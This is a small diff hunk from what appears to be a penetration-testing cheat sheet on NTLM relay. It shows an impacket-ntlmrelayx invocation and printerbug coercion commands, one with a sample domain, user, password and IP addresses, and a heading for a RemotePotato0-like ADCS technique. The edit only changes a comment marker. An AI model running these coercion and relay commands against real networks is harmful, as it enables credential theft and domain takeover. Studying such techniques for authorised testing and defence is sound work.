@@ -15,7 +15,7 @@ impacket-ntlmrelayx \
 --no-raw-server
 
 printerbug 'contoso.org'/'TestAlpha':'win10-gui-P@$swd'@'192.168.68.64' '192.168.68.10'
-# printerbug 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
+## printerbug 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
 ```
 
 ### RemotePotato0-like (MS-DCOM ADCS)
